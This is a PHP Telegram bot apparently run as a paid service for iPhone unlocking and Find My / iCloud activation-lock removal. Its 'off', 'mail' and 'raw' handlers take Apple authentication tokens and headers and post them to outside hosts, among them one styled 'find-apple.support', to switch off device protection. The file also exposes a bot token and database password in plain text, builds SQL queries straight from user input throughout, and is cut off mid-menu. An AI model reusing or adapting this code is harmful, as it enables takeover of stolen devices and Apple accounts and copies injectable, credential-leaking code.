<?php
define('BOT_TOKEN', '1981029592:AAGDpGA9sjUz0a3LPcVVhIGd2Ahv_E45i5s');
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');
define("DATABASE", "termina1_new");
define("USERNAME", "termina1_new");
define("PASSWORD", "new_bot1234");
define("LOCALHOST", "localhost:3306");
$ketnoi = mysqli_connect(LOCALHOST,USERNAME,PASSWORD,DATABASE);
mysqli_query($ketnoi,"set names 'utf8'");
date_default_timezone_set('Asia/Ho_Chi_Minh');
$BOT_TOKEN = "1981029592:AAGDpGA9sjUz0a3LPcVVhIGd2Ahv_E45i5s";
$pattern = '/[0-9]/';
$update = file_get_contents('php://input');
$update = json_decode($update, true);
$userChatId = $update["message"]["from"]["id"]?$update["message"]["from"]["id"]:null;
$user = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userChatId'")->fetch_array();
function delete_files($dir) { 
          foreach(glob($dir . '/*') as $file) { 
            if(is_dir($file)) delete_files($file); else unlink($file); 
          } rmdir($dir); 
        }
function exec_curl_request($handle) {
  $response = curl_exec($handle);

  if ($response === false) {
    $errno = curl_errno($handle);
    $error = curl_error($handle);
    error_log("Curl returned error $errno: $error\n");
    curl_close($handle);
    return false;
  }



  $http_code = intval(curl_getinfo($handle, CURLINFO_HTTP_CODE));
  curl_close($handle);

  if ($http_code >= 500) {
    // do not wat to DDOS server if something goes wrong
    sleep(10);
    return false;
  } else if ($http_code != 200) {
    $response = json_decode($response, true);
    error_log("Request has failed with error {$response['error_code']}: {$response['description']}\n");
    if ($http_code == 401) {
      throw new Exception('Invalid access token provided');
    }
    return false;
  } else {
    $response = json_decode($response, true);
    if (isset($response['description'])) {
      error_log("Request was successful: {$response['description']}\n");
    }
    $response = $response['result'];
  }

  return $response;
}
function apiRequestJson($method, $parameters) {
  if (!is_string($method)) {
    error_log("Method name must be a string\n");
    return "this is the problem";
  }

  if (!$parameters) {
    $parameters = array();
  } else if (!is_array($parameters)) {
    error_log("Parameters must be an array\n");
    return false;
  }

  $parameters["method"] = $method;

  $handle = curl_init(API_URL);
  curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 5);
  curl_setopt($handle, CURLOPT_TIMEOUT, 60);
  curl_setopt($handle, CURLOPT_POST, true);
  curl_setopt($handle, CURLOPT_POSTFIELDS, json_encode($parameters));
  curl_setopt($handle, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));

  return exec_curl_request($handle);
}
if(!empty($user['id']))
{
    if($user['full_name']=='0')
    {
        $firstName = $update["message"]["from"]["first_name"]?$update["message"]["from"]["first_name"]:"N/A";
        $lastName = $update["message"]["from"]["last_name"]?$update["message"]["from"]["last_name"]:"N/A";
        $fullName = $firstName." ".$lastName;
        $ketnoi->query("UPDATE bot SET full_name = '$fullName' WHERE  id_chat= '$userChatId' ");
        send("sendMessage", parameters($userChatId,$fullName));
    }
    $userMessage = $update["message"]["text"]?$update["message"]["text"]:"Nothing";
    switch ($user['lastupdate_id'])
    {
		case 'check':
		    $checkuser = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userChatId'");
           $getallinfo = mysqli_fetch_array($checkuser);
           $userbalance=$getallinfo[balance];
         
		    
		    //deduct
		    $deduct = $userbalance -0.56;
		    $ketnoi ->query("UPDATE bot SET balance = '$deduct' WHERE id_chat='$userChatId'");
		            send("sendMessage", parameters($userChatId,"Processing... ⏳"));
					$url = "https://www.dzgsmserver.net/ibenchserver/CheckStatus.php?imei=" . $userMessage;
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, $url);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

					$output = curl_exec($ch);

					//$html = str_get_html($output);
    
					   $output = $output;
   
					   $output = curl_exec($ch);
                       $output = str_replace('<font face="Georgia" size="4" color="black">', '\n', $output);
                       $output = str_replace("</br>", "\n", $output);
                       $output = str_replace("<br>", "\n", $output);
                       $output = str_replace("</br>", "\n", $output);
                       $output = str_replace("<br/>", "\n", $output);
                       $output = str_replace("<font size=\"4\" face=\"Georgia\" color=\"black\">", "<font size=\"4\" face=\"Georgia\" color=\"black\"", $output);
                       $output = str_replace("\n", "", strip_tags($output));
                       $output = str_replace("Model:","\nModel:", $output);
                       $output = str_replace("DateTime:","\nDateTime:", $output);
                       $output = str_replace("Clean","Clean✅", $output);
                       $output = str_replace("Manufacturer: Apple", "\nManufacturer: Apple", strip_tags($output));
                       $output = str_replace("Find My iPhone:", "\nFind My iPhone:", $output);
                       $output = str_replace("Sim-Lock:", "\nSim-Lock:", $output);
                       $output = str_replace("GSMA Status:", "\nGSMA Status:", $output);
                       $output = str_replace("Lost","Lost❌", $output);
                       $output = str_replace("ON", "ON❌", $output);
                       $output = str_replace("OFF", "OFF✅", $output);
                       $output = str_replace("iCloud Status:", "\niCloud Status:", $output);
                       $output = str_replace("ЁЯХТ:", "\nDate Time:", $output);

					//echo $o;
					send("sendMessage", parameters($userChatId,$output));
					$ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
					break;
			
		case 'off':
		    $checkuser = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userChatId'");
            $getallinfo = mysqli_fetch_array($checkuser);
            $userbalance=$getallinfo[balance];
		    
		    //deduct
		    $deduct = $userbalance -5;
		    $ketnoi ->query("UPDATE bot SET balance = '$deduct' WHERE id_chat='$userChatId'");
		    //process
            $devicefolder = "./data/".$userMessage.'/';
                  if (!file_exists($devicefolder))  send("sendMessage", parameters($userChatId,"CODE Not Exits ❌"));
                  else
                  {
                      $basic = file_get_contents($devicefolder."/d1.txt");
                      $mdm = file_get_contents($devicefolder."/d3.txt");
                      $md = file_get_contents($devicefolder."/d2.txt");
                      $curl = curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_URL => 'https://terminalcreeds.com/terminalcreeds_new/',
                    CURLOPT_POST => 1,
                    CURLOPT_SSL_VERIFYPEER => false, //Bỏ kiểm SSL
                    CURLOPT_POSTFIELDS => http_build_query(array(
                        'apptoken' => $basic,
                        'md' => $md,
                        'mdm' => $mdm,
                    ))
                ));
				send("sendMessage", parameters($userChatId,"Processing... ⏳"));
                $resp = curl_exec($curl);
                curl_close($curl);
				send("sendMessage", parameters($userChatId,$resp));
		        unlink($basic);
		        unlink($basic);
		        unlink($basic);
		        rmdir($userMessage);
				delete_files($devicefolder);
				 $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");          
                 }
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
            break;
        
		
		case 'mail':
		   $checkuser = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userChatId'");
           $getallinfo = mysqli_fetch_array($checkuser);
           $userbalance=$getallinfo[balance];
		    
		    //deduct
		    $deduct = $userbalance -5;
		    $ketnoi ->query("UPDATE bot SET balance = '$deduct' WHERE id_chat='$userChatId'");
		    //process
            $devicefolder = "./data/".$userMessage.'/';
                  if (!file_exists($devicefolder))  send("sendMessage", parameters($userChatId,"Incorrect Mail ❌"));
                 else
                  {
                      $basic = file_get_contents($devicefolder."/d1.txt");
                      $mdm = file_get_contents($devicefolder."/d3.txt");
                      $md = file_get_contents($devicefolder."/d2.txt");
                      $curl = curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_URL => 'https://find-apple.support/find/',
                    CURLOPT_POST => 1,
                    CURLOPT_SSL_VERIFYPEER => false, //Bỏ kiểm SSL
                    CURLOPT_POSTFIELDS => http_build_query(array(
                        'apptoken' => $basic,
                        'md' => $md,
                        'mdm' => $mdm,
                    ))
                ));
				send("sendMessage", parameters($userChatId,"Processing... ⏳"));
                $resp = curl_exec($curl);
                curl_close($curl);
				send("sendMessage", parameters($userChatId,$resp));
				delete_files($devicefolder);
				  $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");          
                 }$ketnoi->query("UPDATE bot SET lastupdate_id = 'addbalanenow' WHERE  id_chat= '$userChatId' ");
            break;
        case 'reg_gsm':
            $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
            $user1 = $ketnoi->query("SELECT * FROM bot WHERE id_chat=".$userMessage)->fetch_array();
            if(!empty($user1['id']))
            {
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId,"Serial already exists ✅"));
            }
            else
            {
                $ketnoi->query("INSERT INTO registered_devices(ecid) VALUES (".",0,0)");
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId,"Added ✅"));
            }
                break;
            
        case 'addcredit':
            $getuser = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userMessage'");
            if(mysqli_num_rows($getuser)==1)
            {
            $ketnoi->query("UPDATE bot SET chatidadd = '$userMessage' WHERE id_chat='$userChatId'");
            $ketnoi->query("UPDATE bot SET lastupdate_id = 'addbalancenow' WHERE id_chat='$userChatId'");
            send("sendMessage", parameters($userChatId, "Please Enter Amount"));
            }
            else
            {
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId, "chatID not Registered! Please enter again"));
            }
            break;
        
            
        case 'addbalancenow':
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
            $checkuser = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userChatId'");
            $getallinfo = mysqli_fetch_array($checkuser);
            $userid = $getallinfo[chatidadd];
            
            //get old balance
            $checkbalance = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userid'");
            $getallinfo = mysqli_fetch_array($checkbalance);
            $userbalance = $getallinfo[balance];
            $addbalance = $userbalance+$userMessage;
            
            //get latest balance
                $ketnoi->query("UPDATE bot SET balance = '$addbalance' WHERE  id_chat= '$userid' ");
            $checkbalance = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userid'");
            $getallinfo = mysqli_fetch_array($checkbalance);
            $newbalance = $getallinfo[balance];
            send("sendMessage",parameters($userChatId, "Credits Added Successfully! Your old balance is $userbalance, new balance is $newbalance"));
            break;
            
         case"addadmin":
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                $ketnoi->query("UPDATE bot SET level_admin = '1' WHERE  id_chat='$userMessage' ");
                $user1 = $ketnoi->query("SELECT * FROM bot WHERE id_chat=".$userMessage)->fetch_array();
            if(!empty($user1['id']))
            {
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId,"User already exists ✅"));
            }
            else
            {
                $ketnoi->query("INSERT INTO bot(id_chat,level_admin,full_name,lastupdate_id) VALUES (".$userMessage.",1,0,0)");
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId,"Added ✅"));
            }
                break;
            case 'meid':
		    $checkuser = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userChatId'");
            $getallinfo = mysqli_fetch_array($checkuser);
            $userbalance=$getallinfo[balance];
		    
		    //deduct
		    $deduct = $userbalance -4;
		    $ketnoi ->query("UPDATE bot SET balance = '$deduct' WHERE id_chat='$userChatId'");
		    $api_key ='1NI-Q9R-5CL-LFH-M9B-NIK-FPV-G8F';
		    $service_id= 12;
		    send("sendMessage", parameters($userChatId,"Processing... ⏳"));
					$url = "https://terminalcreeds.com/newpanel/api/api/meid.php?serial=$userMessage" ;
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, $url);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

					$output = curl_exec($ch);

					//$html = str_get_html($output);
    
					$o = $output;
   
					$o = str_replace('<font face="Georgia" size="4" color="black">', '\n', $o);
					$o = str_replace("<pre>", "\n", $o);
					$o = str_replace("<br>", "\n", $o);
					$o = str_replace("by @savatorr", "", $o);
					$o = str_replace("</br>", "\n", $o);
					$o = str_replace("<br/>", "\n", $o);
					$o = str_replace("IMEI:", "𝗜𝗠𝗘𝗜:", $o);
					$o = str_replace("Serial:", "𝗦𝗲𝗿𝗶𝗮𝗹:", $o);
					$o = str_replace("Model:", "𝗠𝗼𝗱𝗲𝗹:", $o);
					$o = str_replace("Find My iPhone:", "𝗙𝗶𝗻𝗱 𝗠𝘆 𝗶𝗣𝗵𝗼𝗻𝗲:", $o);
					$o = str_replace("LOST", "LOST ❌", $o);
					$o = str_replace("CLEAN", "CLEAN ✅", $o);
					$o = str_replace("Error: Invalid IMEI/Serial Number", "𝗘𝗿𝗿𝗼𝗿: Invalid IMEI/Serial Number ⛔️", $o);
					$o = str_replace("Meid Type : Please Write imei", "𝗠𝗲𝗶𝗱 𝗧𝘆𝗽𝗲: Please Write IMEI ⛔️", $o);
					$o = str_replace("<font size=\"4\" face=\"Georgia\" color=\"black\">", "<font size=\"4\" face=\"Georgia\" color=\"black\"", $o);
					$o = str_replace("\n\n\n", "", strip_tags($o));
					//echo $o;
					send("sendMessage", parameters($userChatId,$o));
					$ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
					break;
        case"adduser":
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                $user1 = $ketnoi->query("SELECT * FROM bot WHERE id_chat=".$userMessage)->fetch_array();
            if(!empty($user1['id']))
            {
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId,"User already exists ✅"));
            }
            else
            {
                $ketnoi->query("INSERT INTO bot(id_chat,level_admin,full_name,lastupdate_id) VALUES (".$userMessage.",0,0,0)");
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId,"Added ✅"));
            }
                break;
        

        case 'raw':
           // $devicefolder = "./data/".$userMessage.'/';
                //  if (!file_exists($devicefolder))  send("sendMessage", parameters($userChatId,"Code Not Exits"));
               //   else
                 // {
                     $token= $userMessage;
                     if($token == null || $token=='' )
                {
                    $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                    send("sendMessage", parameters($userChatId,"Token null"));
                }else
                {
                        $basic = strstr($token,"Basic");
                $basic = substr($basic,0,294);
                //$basic = substr($basic,6);
                //
                $mdm = strstr($token,"X-Apple-I-MD-M: ");
                $mdm = substr($mdm,0,96);
                $mdm = substr($mdm,16);
               //
                $md = strstr($token,"X-Apple-I-MD: ");
                $md = substr($md,0,54);
                $md = substr($md,14);

                $curl = curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_URL => 'http://vbypass.tech/botteles/',
                    CURLOPT_POST => 1,
                    CURLOPT_SSL_VERIFYPEER => false, //Bỏ kiểm SSL
                    CURLOPT_POSTFIELDS => http_build_query(array(
                        'apptoken' => $basic,
                        'md' => $md,
                        'mdm' => $mdm,
                    ))
                ));
				send("sendMessage", parameters($userChatId,"Processing... ⏳"));
                $resp = curl_exec($curl);
                curl_close($curl);
				send("sendMessage", parameters($userChatId,$resp));
				 $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");          
                }
            break;	
        case 'add':
            $user1 = $ketnoi->query("SELECT * FROM bot WHERE id_chat=".$userMessage)->fetch_array();
            if(!empty($user1['id']))
            {
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId,"User already exists ✅"));
            }
            else
            {
                $ketnoi->query("INSERT INTO bot(id_chat,level_admin,full_name,lastupdate_id) VALUES (".$userMessage.",0,0,0)");
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId,"Added ✅"));
            }
            break;
        case 'delete':
            if($userMessage!=$userChatId)
            {
                $ketnoi->query("DELETE FROM `bot` WHERE id_chat=".$userMessage);
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId,"Deleted Successfully ✅"));
            }
            else
            {
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE  id_chat= '$userChatId' ");
                send("sendMessage", parameters($userChatId,"Must Not Be Deleted ❌"));
            }
            
         break;
        
                
    }

    if($user['level_admin']==0)
    {
        $userMessage = $update["message"]["text"]?$update["message"]["text"]:"Nothing";
        switch($userMessage)
        { 
            case"/start":
                $replyMsg = "➡️ $userChatId, Welcome To User 🤖, Select Service:";
               apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsg, 'reply_markup' => array(
               $keyboard =[ ["FMiP OFF/ON 🔎","ICloud Clean/Lost🔑🔑🔑"],
        ["ICloud Clean/Lost (S2)", "Apple Basic Info☠"],
        ["Sim-Lock Status🔐","Model Checker Free📱✅"],
        ["Server Tools⚙","Icloud Clean"],
        ["Macbook check🔥⚡💻","Unlocks🔓"],
        ["Mina Services📞💡","More Unlocks"],
        ["Generic Check🔥","Mac Address"],
                ["Account Info⏳👨" ]],
                
                'resize_keyboard' => true,
                'keyboard' => $keyboard)));  
            break;
             case"Mac Address":
                $ketnoi->query("UPDATE bot SET lastupdate_id = 'Mac_checker' WHERE  id_chat= '$userChatId' ");     
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Serial for A8", "Serial for A5/A5X/A6X"],
        ["Serial for A7"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
            case"Icloud Clean":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Icloud Clean All Countries", "Icloud Clean Apple Store"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
             case"Generic Check🔥":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Samsung Info","Xiaomi Lock Status🔐"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
            case"More Unlocks":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Activation Check ✔","All in One"],
        ["Verizon Check", "T-Mobile Check"],
        ["MDM status on/off", "Sprint Check"],
        ["Replaced Status", "Repair Status"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
          
            case"Macbook check🔥⚡💻":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Macbook/iMac info,icloud","Macbook/iMac Icloud check"],
        ["Macbook CTO check"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
            case "Account Info⏳👨":
                $checkuser = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userChatId'");
                $getallinfo = mysqli_fetch_array($checkuser);
                $userbalance= $getallinfo[balance];
                $replyMsgg = "Select Service:";
                send("sendMessage", parameters($userChatId, "Admin balance is $userbalance"));
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
                $keyboardd =[["Create Update 📱✅"],                [
                ["👈Go Back" ]],
                ],
        'resize_keyboard' => true,
        'keyboard' => $keyboardd)));
        
        
                break;
            case"Unlocks🔓":
                 $ketnoi->query("UPDATE bot SET lastupdate_id='unlocks' WHERE id_chat='$userChatId'");
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ 
        ["Sprint Unlock", "Docomo Japan"],
        ["Verizon Usa Prem All","AT&T Check Unlock"],
        ["Tracfone Usa/StraightT","Verizon Clean Unlock"],
        ["AT&T Premium","AT&T Active Other Unlock"],
        ["KDDi Unlock","T-Mobile Usa iPhone"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
             case "Mina Services📞💡":
                $ketnoi->query("UPDATE bot SET lastupdate_id='mina_services' WHERE id_chat='$userChatId'");
                $replyMsgg = "Select Service:";
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Mina iCL-Removal Pass ","Macbook Bypass T2 Chip"],
        ["MEID iPhone 5S", "MEID iPhone 6, 6Plus"],
        ["MEID iPhone 6S, 6SP, SE","MEID iPhone 7, 7P"],
        ["MEID iPhone 8, 8P","MEID iPhone X"],
        ["MEID iPad All Model","Mina USB Patcher"],
        ["👈Go Back"],
       
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
               
                break;
                
        case"Server Tools⚙":
             $ketnoi->query("UPDATE bot SET lastupdate_id='ibypasser' WHERE id_chat='$userChatId'");
            $replyMsgg = "Select Service:";
            apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
    $keyboard =[ ["iBypasser $50","iBypasser $30"],
    ["iBypasser $10"],
    ["👈Go Back"],
    ],
    'resize_keyboard' => true,
    'keyboard' => $keyboard))); 
            break;
			case"FMiP OFF/ON 🔎":
                 $ketnoi->query("UPDATE bot SET lastupdate_id = 'fmi_check' WHERE  id_chat= '$userChatId' "); 
                $replyMsg = "🛒 FMiP ON/OFF🔎\n
💰 Price: 0.02 USD\n
✔️ Submit your IMEIs:";
               
                //$ketnoi->query("UPDATE bot SET lastupdate_id = 'check' WHERE  id_chat='$userChatId' ");
                send("sendMessage", parameters($userChatId,$replyMsg));
                break;
            
            default:
                 $replyMsgg = "Select Service:";
                  apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
         $keyboard =[ ["FMiP OFF/ON 🔎","ICloud Clean/Lost🔑🔑🔑"],
        ["ICloud Clean/Lost (S2)", "Apple Basic Info☠"],
        ["Sim-Lock Status🔐","Model Checker Free📱✅"],
        ["Server Tools⚙","Icloud Clean"],
        ["Macbook check🔥⚡💻","Unlocks🔓"],
        ["Mina Services📞💡","More Unlocks"],
        ["Generic Check🔥","Mac Address"],
        ["Account Info⏳👨 " ]]
        ,
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard)));  
        break;
                
        }
        
    
   
    
    }if($user['level_admin']==2)
    {
        $userMessage = $update["message"]["text"]?$update["message"]["text"]:"Nothing";
        switch($userMessage)
        {
            
            case"/start":
                $ketnoi->query("UPDATE bot SET lastupdate_id = '0' WHERE id_chat = '$userChatId'");
                $replyMsg = "➡️ Welcome Admin !, Select Service:";
        apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsg, 'reply_markup' => array(
         $keyboard =[ ["FMiP OFF/ON 🔎","ICloud Clean/Lost🔑🔑🔑"],
        ["ICloud Clean/Lost (S2)", "Apple Basic Info☠"],
        ["Sim-Lock Status🔐","Model Checker Free📱✅"],
        ["Server Tools⚙","Icloud Clean"],
        ["Macbook check🔥⚡💻","Unlocks🔓"],
        ["Mina Services📞💡","More Unlocks"],
        ["Generic Check🔥","Mac Address"],
        ["View All Users", "Add User"],
        ["Add Admin", "Add Credits"],
        ["Delete User/Admin", "Update! Coming soon!"],
        ["Account Info⏳👨"]
        ,],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard)));  
                break;
                
            
            case"Mac Address":
                if ($lastupdate_id == "0"){
                $ketnoi->query("UPDATE bot SET lastupdate_id = 'Mac_address' WHERE  id_chat= '$userChatId' ");     
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Serial for A8", "Serial for A5/A5X/A6X"],
        ["Serial for A7"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                }
                break;
            case"Icloud Clean":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Icloud Clean All Countries", "Icloud Clean Apple Store"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
             case"Generic Check🔥":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Samsung Info","Xiaomi Lock Status🔐"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
            case"More Unlocks":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Activation Check ✔","All in One"],
        ["Verizon Check", "T-Mobile Check"],
        ["MDM status on/off", "Sprint Check"],
        ["Replaced Status", "Repair Status"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
          
            case"Macbook check🔥⚡💻":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Macbook/iMac info,icloud","Macbook/iMac Icloud check"],
        ["Macbook CTO check"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
            case "Account Info⏳👨":
                
                $checkuser = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userChatId'");
                $getallinfo = mysqli_fetch_array($checkuser);
                $userbalance= $getallinfo[balance];
                $replyMsgg = "Select Service:";
                send("sendMessage", parameters($userChatId, "Admin balance is $userbalance"));
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
                $keyboardd =[["Create Update 📱✅"], 
                
                ["👈Go Back" ],
                ],
        'resize_keyboard' => true,
        'keyboard' => $keyboardd)));
        
        
                break;
    
            
                
            case"Create Update 📱✅":
                $mesg="Enter Message:";
                send("sendMessage", parameters($userChatId, $mesg));
                $query = "UPDATE `admin` SET `status` = 'sendtoall' WHERE `chat_id` = $userChatId";
                $users = mysqli_query($ketnoi,$query);
                //xxxsss
                
                /*
                
                //end
                /*
                $users= "SELECT * FROM bot WHERE id_chat='$userid ";
                #$users=explode("\n",$users);
                foreach ($users as $user)
                {
                    if (empty($user)) continue;
                    $data = [
                        'chat_id' => $user,
                        'text' => $mesg
                    ];
                
                    $response = file_get_contents("https://api.telegram.org/bot$BOT_TOKEN/sendMessage?". http_build_query($data) );
                    
                }
                */
                break;
            case"👈Go Back":
                
                 $ketnoi->query("UPDATE bot SET lastupdate_id='0' WHERE id_chat='$userChatId'");
                $replyMsgg = "Select Service:";
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
         $keyboard =[ ["FMiP OFF/ON 🔎","ICloud Clean/Lost🔑🔑🔑"],
        ["ICloud Clean/Lost (S2)", "Apple Basic Info☠"],
        ["Sim-Lock Status🔐","Model Checker Free📱✅"],
        ["Server Tools⚙","Icloud Clean"],
        ["Macbook check🔥⚡💻","Unlocks🔓"],
        ["Mina Services📞💡","More Unlocks"],
        ["Generic Check🔥","Mac Address"],
        ["View All Users", "Add User"],
        ["Add Admin", "Add Credits"],
        ["Delete User/Admin", "Update! Coming soon!"],
        ["Account Info⏳👨"]
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
            case"Unlocks🔓":
                 //$ketnoi->query("UPDATE bot SET lastupdate_id='unlocks' WHERE id_chat='$userChatId'");
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ 
        ["Sprint Unlock", "Docomo Japan"],
        ["Verizon Usa Prem All","AT&T Check Unlock"],
        ["Tracfone Usa/StraightT","Verizon Clean Unlock"],
        ["AT&T Premium","AT&T Active Other Unlock"],
        ["KDDi Unlock","T-Mobile Usa iPhone"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
                
              case "Add Credits":
                //$ketnoi->query("UPDATE bot SET lastupdate_id='addcredit' WHERE id_chat='$userChatId'");
                send("sendMessage", parameters($userChatId, "Please enter ChatID"));
               
                break;
             case "Mina Services📞💡":
                //$ketnoi->query("UPDATE bot SET lastupdate_id='mina_services' WHERE id_chat='$userChatId'");
                $replyMsgg = "Select Service:";
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Mina iCL-Removal Pass ","Macbook Bypass T2 Chip"],
        ["MEID iPhone 5S", "MEID iPhone 6, 6Plus"],
        ["MEID iPhone 6S, 6SP, SE","MEID iPhone 7, 7P"],
        ["MEID iPhone 8, 8P","MEID iPhone X"],
